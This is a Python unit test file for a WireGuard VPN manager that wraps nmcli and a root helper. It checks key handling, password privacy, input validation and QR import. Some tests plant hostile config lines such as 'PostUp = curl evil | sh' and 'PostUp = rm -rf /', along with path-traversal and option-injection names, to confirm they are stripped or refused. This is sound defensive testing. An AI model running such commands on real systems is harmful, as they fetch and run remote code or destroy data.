import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from PIL import Image  # noqa: E402

from wirezero import keys, nm  # noqa: E402
from wirezero.display import to_rgb565  # noqa: E402

# Dummy config. The keys are the public example keys from the wg(8) man page,
# not real secrets.
CONF = """[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.8.0.4/24
DNS = 10.8.0.1

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
Endpoint = vpn.example.net:51820
AllowedIPs = 10.8.0.0/24
"""


class FakeRunner:
    """Records nmcli calls and returns canned output."""

    def __init__(self, responses):
        self.responses = responses
        self.calls = []

    def __call__(self, args, timeout, stdin_text=None, extra_env=None):
        self.calls.append(args[1:])
        self.envs = getattr(self, "envs", []) + [extra_env]
        key = " ".join(args[1:])
        for prefix, resp in self.responses:
            if key.startswith(prefix):
                return resp
        return 0, "", ""


class TestParsing(unittest.TestCase):
    def test_split_terse_escapes(self):
        self.assertEqual(nm.split_terse(r"a\:b:c\\d:"), ["a:b", "c\\d", ""])

    def test_parse_connections_filters_wireguard(self):
        out = ("Home WiFi:aaa:802-11-wireless:yes:yes:wlan0\n"
               "home:bbb:wireguard:yes:yes:home\n"
               "office:ccc:wireguard:no:no:\n")
        ts = nm.parse_connections(out)
        self.assertEqual([t.name for t in ts], ["home", "office"])
        self.assertEqual(ts[0].state, "up")
        self.assertTrue(ts[0].autoconnect)
        self.assertEqual(ts[1].device, "")

    def test_parse_show(self):
        out = ("connection.id:home\nIP4.ADDRESS[1]:10.8.0.4/24\nIP4.ADDRESS[2]:10.9.0.1/24\n"
               "ipv4.dns:--\n")
        p = nm.parse_show(out)
        self.assertEqual(p["IP4.ADDRESS"], ["10.8.0.4/24", "10.9.0.1/24"])
        self.assertNotIn("ipv4.dns", p)

    def test_sanitize_ifname(self):
        self.assertEqual(nm.sanitize_ifname("my vpn (work)!"), "myvpnwork")
        self.assertEqual(len(nm.sanitize_ifname("a-really-long-tunnel-name")), 15)
        self.assertEqual(nm.sanitize_ifname("home", {"home"}), "home1")
        self.assertEqual(nm.sanitize_ifname("..."), "wg")
        self.assertEqual(nm.sanitize_ifname("-rf"), "rf")

    def test_human_bytes(self):
        self.assertEqual(nm.human_bytes(512), "512 B")
        self.assertEqual(nm.human_bytes(1536), "1.5 KB")


class TestKeysInConfig(unittest.TestCase):
    def test_cleans_invisible_chars_and_spaces(self):
        dirty = CONF.replace("PrivateKey = yAnz5TF+", "PrivateKey = \ufeffyAnz5 TF+").replace(
            "B3fBmk=", "B3fBmk=\u200b\r")
        fixed, problems = nm.normalize_keys(dirty)
        self.assertEqual(problems, [])
        self.assertIn("PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n", fixed)

    def test_restores_lost_padding(self):
        fixed, problems = nm.normalize_keys(CONF.replace("B3fBmk=", "B3fBmk"))
        self.assertEqual(problems, [])

    def test_reports_bad_key_without_revealing_it(self):
        bad = CONF.replace("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=", "yAnz5TF+lXXJte14tji3zl")
        _, problems = nm.normalize_keys(bad)
        self.assertEqual(len(problems), 1)
        self.assertIn("PrivateKey (line 2): 22 characters", problems[0])
        self.assertNotIn("yAnz5", problems[0])
        _, p2 = nm.normalize_keys(CONF.replace("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=", "<hidden>"))
        self.assertIn("placeholder", p2[0])
        _, p3 = nm.normalize_keys(CONF.replace("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=", ""))
        self.assertIn("Regenerate this client's keys", p3[0])


class TestReviewFixes(unittest.TestCase):
    def test_names_and_uuids_reject_trailing_newline(self):
        from wirezero import helper
        self.assertIsNone(nm.NAME_RE.fullmatch("vpn\n"))
        self.assertIsNone(helper.UUID_RE.fullmatch("11111111-2222-3333-4444-555555555555\n"))

    def test_routing_hijack_settings_refused(self):
        bad = CONF.replace("Address = 10.8.0.4/24", "Address = 10.8.0.4/24\nTable = 253\nFwMark = 1\nListenPort = 53")
        probs = nm.policy_problems(bad)
        self.assertEqual(len(probs), 3)
        ok = CONF.replace("Address = 10.8.0.4/24", "Address = 10.8.0.4/24\nTable = off\nListenPort = 51820")
        self.assertEqual(nm.policy_problems(ok), [])
        with self.assertRaises(nm.NMError):
            nm.NMBackend(FakeRunner([])).import_text(bad, "x")

    def test_inline_comment_after_key_is_fine(self):
        _, problems = nm.normalize_keys(CONF.replace("B3fBmk=", "B3fBmk= # laptop"))
        self.assertEqual(problems, [])

    def test_full_tunnel_detection(self):
        self.assertTrue(nm.is_full_tunnel("AllowedIPs = 0.0.0.0/1, 128.0.0.0/1"))
        self.assertFalse(nm.is_full_tunnel("AllowedIPs = 10.0.0.0/8 # not 0.0.0.0/0"))

    def test_zbar_payload_with_nul_is_read_exactly(self):
        try:
            import qrcode
            from wirezero.camera import Zbar
            z = Zbar()
        except Exception as e:
            self.skipTest("zbar/qrcode not available: %s" % e)
        payload = b"A\x00" + b"B" * 300
        q = qrcode.QRCode(border=4)
        q.add_data(payload)
        img = q.make_image().convert("L").resize((800, 800), Image.NEAREST)
        out = z.decode(img.tobytes(), 800, 800)
        self.assertTrue(all(len(p) <= len(payload) for p in out))


class TestBackend(unittest.TestCase):
    def test_list_merges_activating_state(self):
        r = FakeRunner([
            ("-t -f NAME", (0, "home:u1:wireguard:no:yes:home\n", "")),
            ("-t -f UUID,STATE", (0, "u1:activating\n", "")),
        ])
        ts = nm.NMBackend(r).list_tunnels()
        self.assertEqual(ts[0].state, "activating")

    def test_auth_error_flagged(self):
        r = FakeRunner([("--wait", (1, "", "Error: Not authorized to control networking.\n")),
                        ("-n", (1, "", "sudo: a password is required\n"))])
        with self.assertRaises(nm.NMError) as cm:
            nm.NMBackend(r).up(nm.Tunnel("home", "u1", False, "down"))
        self.assertTrue(cm.exception.need_password)   # falls back to helper, which asks

    def test_connect_without_password_when_allowed(self):
        r = FakeRunner([])
        nm.NMBackend(r).up(nm.Tunnel("home", "u1", False, "down"))
        self.assertEqual(len(r.calls), 1)               # plain nmcli, no sudo
        self.assertEqual(r.calls[0][:3], ["--wait", "25", "connection"])

    def test_password_goes_via_askpass_env_only(self):
        r = FakeRunner([("-n", (1, "", "sudo: a password is required\n"))])
        b = nm.NMBackend(r)
        b.password = "s3cr3t!"
        b.delete(nm.Tunnel("x", "11111111-2222-3333-4444-555555555555", False, "down"))
        argv = r.calls[-1]
        self.assertEqual(argv[:3], ["-A", "-k", nm.HELPER])
        self.assertNotIn("s3cr3t!", " ".join(argv))
        self.assertEqual(r.envs[-1], {"SUDO_ASKPASS": nm.ASKPASS, nm.PASSWORD_ENV: "s3cr3t!"})

    def test_wrong_password_is_reported_and_forgotten(self):
        r = FakeRunner([("-n", (1, "", "sudo: a password is required\n")),
                        ("-A", (1, "", "sudo: 3 incorrect password attempts\n"))])
        b = nm.NMBackend(r)
        b.password = "nope"
        with self.assertRaises(nm.NMError) as cm:
            b.delete(nm.Tunnel("x", "11111111-2222-3333-4444-555555555555", False, "down"))
        self.assertTrue(cm.exception.bad_password)
        self.assertIsNone(b.password)

    def test_import_goes_through_helper_with_stdin(self):
        seen = {}

        def runner(args, timeout, stdin_text=None):
            seen["args"], seen["stdin"] = args, stdin_text
            return 0, "WorkVPN\n", ""
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "Work VPN.conf")
            with open(src, "w") as fh:
                fh.write(CONF + "PostUp = curl evil | sh\n")
            name, warns = nm.NMBackend(runner).import_conf(src)
        self.assertEqual(name, "WorkVPN")
        self.assertEqual(seen["args"][:3], [nm.SUDO, "-n", nm.HELPER])
        self.assertEqual(seen["args"][3:], ["import", "WorkVPN"])
        self.assertIn("PrivateKey", seen["stdin"])         # key travels on stdin only
        self.assertNotIn(src, " ".join(seen["args"]))       # no user path given to root
        self.assertIn("PostUp/PreUp lines were ignored", warns)

    def test_import_refuses_symlink_and_huge_files(self):
        with tempfile.TemporaryDirectory() as d:
            real = os.path.join(d, "real.conf")
            with open(real, "w") as fh:
                fh.write(CONF)
            link = os.path.join(d, "link.conf")
            os.symlink(real, link)
            with self.assertRaises(nm.NMError):
                nm.NMBackend(FakeRunner([])).import_conf(link)
            big = os.path.join(d, "big.conf")
            with open(big, "w") as fh:
                fh.write(CONF + "#" * (nm.MAX_CONF_BYTES + 10))
            with self.assertRaises(nm.NMError):
                nm.NMBackend(FakeRunner([])).import_conf(big)

    def test_sudo_refusal_is_flagged_as_auth(self):
        r = FakeRunner([("-n", (1, "", "sudo: a password is required\n"))])
        with self.assertRaises(nm.NMError) as cm:
            nm.NMBackend(r).delete(nm.Tunnel("x", "u", False, "down"))
        self.assertTrue(cm.exception.auth)

    def test_errors_never_show_keys(self):
        key = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
        r = FakeRunner([("connection down", (1, "", "Error: bad line PrivateKey = %s\n" % key))])
        with self.assertRaises(nm.NMError) as cm:
            nm.NMBackend(r).down(nm.Tunnel("x", "u", False, "up"))
        self.assertNotIn(key, str(cm.exception))

    def test_import_rejects_non_wireguard(self):
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "x.conf")
            with open(src, "w") as fh:
                fh.write("[server]\nport=1\n")
            with self.assertRaises(nm.NMError):
                nm.NMBackend(FakeRunner([])).import_conf(src)


class TestHelper(unittest.TestCase):
    """The root helper: strict inputs, WireGuard-only, scripts stripped."""

    def setUp(self):
        import io
        sys.stdin = io.TextIOWrapper(io.BytesIO(b""))   # never read the real terminal
        from wirezero import helper
        self.h = helper
        self.calls = []
        self.types = {"11111111-2222-3333-4444-555555555555": "wireguard",
                      "aaaaaaaa-2222-3333-4444-555555555555": "802-11-wireless"}
        self.written = {}

        def fake_nmcli(*args, timeout=20):
            self.calls.append(args)
            if args[:2] == ("-g", "connection.type"):
                return self.types.get(args[-1], "") + "\n"
            if args[:2] == ("-g", "NAME"):
                return "home\n"
            if args[:3] == ("connection", "import", "type"):
                with open(args[-1]) as fh:
                    self.written["conf"] = fh.read()
                self.written["mode"] = os.stat(args[-1]).st_mode & 0o777
                return ""
            if args[:3] == ("-t", "-f", "NAME,UUID,TYPE"):
                return "work:99999999-2222-3333-4444-555555555555:wireguard\n"
            return ""
        self._orig = helper.nmcli
        helper.nmcli = fake_nmcli
        # The real helper runs as root and uses /run; tests use a private temp dir.
        self._tmp = tempfile.TemporaryDirectory()
        self._orig_tmp_root = helper.TMP_ROOT
        helper.TMP_ROOT = self._tmp.name

    def tearDown(self):
        self.h.nmcli = self._orig
        self.h.TMP_ROOT = self._orig_tmp_root
        self._tmp.cleanup()
        sys.stdin = sys.__stdin__

    def test_nmcli_error_shows_reason_not_temp_path(self):
        import subprocess as sp
        orig_run = sp.run

        class R:
            returncode, stdout = 1, ""
            stderr = "Error: failed to import '/tmp/wirezero-ab12/vpn.conf': invalid secret 'PrivateKey' at /tmp/wirezero-ab12/vpn.conf:2.\n"
        sp.run = lambda *a, **k: R()
        try:
            with self.assertRaises(self.h.Fail) as cm:
                self._orig("connection", "import")
        finally:
            sp.run = orig_run
        self.assertEqual(str(cm.exception), "Import failed: invalid secret 'PrivateKey' on line 2.")

    def test_up_down_only_for_wireguard(self):
        if os.geteuid() != 0:
            self.skipTest("main() exits early when not root")
        self.assertEqual(self.h.main(["up", "aaaaaaaa-2222-3333-4444-555555555555"]), 1)   # Wi-Fi
        self.assertEqual(self.h.main(["up", "11111111-2222-3333-4444-555555555555"]), 0)
        self.assertIn(("--wait", "25", "connection", "up", "uuid",
                       "11111111-2222-3333-4444-555555555555"), self.calls)

    def test_require_wireguard_blocks_wifi_and_bad_ids(self):
        with self.assertRaises(self.h.Fail):
            self.h.require_wireguard("aaaaaaaa-2222-3333-4444-555555555555")
        with self.assertRaises(self.h.Fail):
            self.h.require_wireguard("--help")
        self.h.require_wireguard("11111111-2222-3333-4444-555555555555")

    def test_import_strips_scripts_and_hardens(self):
        import io
        conf = CONF.replace("[Peer]", "PostUp = rm -rf /\n[Peer]").replace(
            "AllowedIPs = 10.8.0.0/24", "AllowedIPs = 0.0.0.0/0")
        sys.stdin = io.TextIOWrapper(io.BytesIO(conf.encode()))
        try:
            self.h.do_import("work")
        finally:
            sys.stdin = sys.__stdin__
        self.assertNotIn("PostUp", self.written["conf"])
        self.assertEqual(self.written["mode"], 0o600)
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("connection.autoconnect no" in c for c in flat))
        self.assertTrue(any("ipv4.dns-priority -50" in c for c in flat))

    def test_import_rejects_bad_names_and_duplicates(self):
        for bad in ("../etc", "a b", "x" * 16, "-rf"):
            with self.assertRaises(self.h.Fail):
                self.h.do_import(bad)
        import io
        sys.stdin = io.TextIOWrapper(io.BytesIO(CONF.encode()))
        try:
            with self.assertRaises(self.h.Fail):
                self.h.do_import("home")
        finally:
            sys.stdin = sys.__stdin__

    def test_main_refuses_unknown_commands(self):
        if os.geteuid() != 0:
            self.skipTest("main() exits early when not root")
        self.assertEqual(self.h.main(["show-secrets", "x"]), 2)
        self.assertEqual(self.h.main(["autoconnect", "11111111-2222-3333-4444-555555555555", "maybe"]), 2)


class TestKeys(unittest.TestCase):
    def test_arrows_and_repeat(self):
        self.assertEqual(keys.translate(keys.KEY_F, 1), "up")
        self.assertEqual(keys.translate(keys.KEY_X, 2), "down")
        self.assertIsNone(keys.translate(keys.KEY_ENTER, 2))  # no repeat-fire on Enter
        self.assertIsNone(keys.translate(keys.KEY_ENTER, 0))
        self.assertEqual(keys.translate(keys.KEY_SLASH, 1, shift=True), "help")
        self.assertEqual(keys.translate(keys.KEY_8, 1), "k8")
        self.assertEqual(keys.char_for(keys.KEY_F, 1), "f")
        self.assertEqual(keys.char_for(keys.KEY_MINUS, 1, shift=True), "_")
        self.assertEqual(keys.char_for(keys.KEY_1, 1), "1")
        self.assertEqual(keys.char_for(keys.KEY_1, 1, shift=True), "!")
        self.assertEqual(keys.char_for(keys.KEY_SLASH, 1, shift=True), "?")
        self.assertEqual(keys.char_for(keys.KEY_SPACE, 1), " ")


class TestZbar(unittest.TestCase):
    def test_decodes_wireguard_qr(self):
        try:
            import qrcode
            from wirezero.camera import Zbar, decode_text
            z = Zbar()
        except Exception as e:
            self.skipTest("zbar/qrcode not available: %s" % e)
        frame = Image.new("L", (640, 480), 140)
        frame.paste(qrcode.make(CONF).convert("L").resize((300, 300)), (170, 90))
        self.assertEqual(decode_text(z.decode(frame.tobytes(), 640, 480)), CONF)


class TestDisplay(unittest.TestCase):
    def test_rgb565_matches_reference(self):
        img = Image.new("RGB", (4, 1))
        px = [(255, 0, 0), (0, 255, 0), (0, 0, 255), (123, 45, 210)]
        for i, c in enumerate(px):
            img.putpixel((i, 0), c)
        ref = b""
        for r, g, b in px:
            v = ((r >> 3) << 11) | ((g >> 2) << 5) | (b >> 3)
            ref += bytes((v & 0xFF, v >> 8))
        self.assertEqual(to_rgb565(img), ref)


class TestApp(unittest.TestCase):
    def make(self, scanner=None):
        from wirezero.display import PNGDisplay
        from wirezero.ui import App
        fake = nm.FakeBackend()
        app = App(fake, PNGDisplay(), None, conf_finder=lambda: [],
                  scanner_factory=scanner or (lambda: None), camera_check=lambda: True)
        app.start()
        return fake, app

    def wait(self, app):
        import time
        for _ in range(100):
            app.tick([])
            if not app.busy:
                return
            time.sleep(0.01)

    def test_toggle_and_delete_flow(self):
        fake, app = self.make()
        app.tick(["down"])                      # office
        app.tick(["enter"])
        self.wait(app)
        self.assertEqual(fake.tunnels[1].state, "up")
        app.tick(["k8"])
        self.assertIsNotNone(app.confirm)
        app.tick(["esc"])                       # cancel keeps it
        self.assertEqual(len(fake.tunnels), 3)
        app.tick(["k8", "enter"])
        self.wait(app)
        self.assertEqual(len(fake.tunnels), 2)

    def test_auth_failure_is_shown(self):
        fake, app = self.make()
        fake.fail_auth = True
        app.tick(["k7"])
        self.wait(app)
        self.assertIn("Not authorized", (app.toast or ("",))[0] + " ".join(app.error_lines))

    def test_password_prompt_then_retry(self):
        fake, app = self.make()
        fake.require_password = "pa ss!"
        app.tick(["k8", "enter"])            # delete -> confirm
        self.wait(app)
        self.assertEqual(app.screen, "password")
        app.tick(["ch:x", "enter"])          # wrong
        self.wait(app)
        self.assertEqual(app.screen, "password")
        self.assertTrue(app.pw_wrong)
        # "h" and "k4" are ignored while typing; symbols and spaces are allowed
        app.tick(["ch:p", "ch:a", "ch: ", "ch:s", "ch:s", "ch:!", "h", "k4", "enter"])
        self.wait(app)
        self.assertEqual(len(fake.tunnels), 2)       # deleted after the right password
        self.assertEqual(app.pw_text, "")
        app.tick(["k8", "enter"])                     # cached: no prompt this time
        self.wait(app)
        self.assertEqual(len(fake.tunnels), 1)
        app.pw_set_at -= app.PASSWORD_TTL + 1         # expires
        app.tick([])
        self.assertIsNone(fake.password)

    def test_no_screenshot_on_password_screen(self):
        _, app = self.make()
        app.ask_password(("x", lambda: None, None))
        with tempfile.TemporaryDirectory() as home:
            old = os.environ.get("HOME")
            os.environ["HOME"] = home
            try:
                app.tick(["screenshot"])
            finally:
                if old is not None:
                    os.environ["HOME"] = old
            self.assertFalse(os.path.exists(os.path.join(home, "Pictures")))

    def test_import_offers_to_remove_key_file(self):
        fake, app = self.make()
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "trip.conf")
            with open(src, "w") as fh:
                fh.write(CONF)
            app.find_confs = lambda: [src]
            app.tick(["k5", "enter"])
            self.wait(app)
            self.assertIsNotNone(app.confirm)
            app.tick(["enter"])
            self.assertFalse(os.path.exists(src))
        self.assertTrue(any(t.name == "trip" for t in fake.tunnels))

    def test_screenshot_saved_without_toast(self):
        _, app = self.make()
        with tempfile.TemporaryDirectory() as home:
            old = os.environ.get("HOME")
            os.environ["HOME"] = home
            try:
                app.tick([])
                app.tick(["screenshot"])
            finally:
                if old is not None:
                    os.environ["HOME"] = old
            shots = os.listdir(os.path.join(home, "Pictures", "Screenshots"))
            self.assertEqual(len(shots), 1)
            with Image.open(os.path.join(home, "Pictures", "Screenshots", shots[0])) as img:
                self.assertEqual(img.size, (320, 170))
        self.assertEqual(keys.translate(keys.KEY_SYSRQ, 1), "screenshot")

    def test_qr_scan_name_and_import(self):
        class Fake:
            def __init__(s2):
                s2.error, s2.texts = None, ["not a config", CONF]
            def latest(s2):
                return None
            def take_result(s2):
                return s2.texts.pop(0) if s2.texts else None
            def stop(s2):
                pass
        shared = Fake()
        fake, app = self.make(scanner=lambda: shared)
        app.tick(["k5", "k6"])             # opens camera; first (junk) QR is ignored
        self.assertEqual(app.screen, "scan")
        self.assertIn("isn't a WireGuard", app.toast[0])
        app.tick([])                       # WireGuard QR -> name box
        self.assertEqual(app.screen, "name")
        app.tick(["backspace"] * 5 + ["ch:h", "ch:o", "ch:m", "up", "k4", "ch:e", "ch:-", "ch:!", "ch:2"])
        self.assertEqual(app.name_text, "home-2")   # arrows/number actions ignored while typing
        app.tick(["enter"])
        self.wait(app)
        self.assertIsNone(app.pending_conf)         # key text dropped after import
        self.assertTrue(any(t.name == "home-2" for t in fake.tunnels))

    def test_name_box_rejects_bad_names(self):
        _, app = self.make()
        app.pending_conf, app.screen, app.name_text = CONF, "name", "-x"
        app.tick(["enter"])
        self.assertEqual(app.screen, "name")

    def test_no_screenshot_while_scanning(self):
        class Cam:
            error, rejected = None, False
            def latest(s2): return None
            def take_result(s2): return None
            def stop(s2): pass
        _, app = self.make(scanner=lambda **kw: Cam())
        with tempfile.TemporaryDirectory() as home:
            old = os.environ.get("HOME")
            os.environ["HOME"] = home
            try:
                app.tick(["k5", "k6"])
                self.assertEqual(app.screen, "scan")
                app.tick(["screenshot"])
            finally:
                if old is not None:
                    os.environ["HOME"] = old
            self.assertFalse(os.path.exists(os.path.join(home, "Pictures")))

    def test_screenshots_are_private(self):
        _, app = self.make()
        with tempfile.TemporaryDirectory() as home:
            old = os.environ.get("HOME")
            os.environ["HOME"] = home
            try:
                app.tick([])
                app.tick(["screenshot"])
            finally:
                if old is not None:
                    os.environ["HOME"] = old
            d = os.path.join(home, "Pictures", "Screenshots")
            f = os.path.join(d, os.listdir(d)[0])
            self.assertEqual(os.stat(f).st_mode & 0o777, 0o600)

    def test_toast_waits_for_dialog(self):
        _, app = self.make()
        app.show_toast("Imported as 'x'")
        app.confirm = ("Remove the original file?", "It contains your private key",
                       lambda: None, "remove")
        app.tick([])
        img = app.render()
        # bottom strip above the bar shows the dialog, not the toast panel
        self.assertNotEqual(img.getpixel((5, 120)), (22, 27, 34))
        app.tick(["esc"])
        self.assertIsNotNone(app.toast)          # still there after answering

    def test_esc_quits_from_list(self):
        _, app = self.make()
        app.tick(["esc"])
        self.assertFalse(app.running)


if __name__ == "__main__":
    unittest.main()
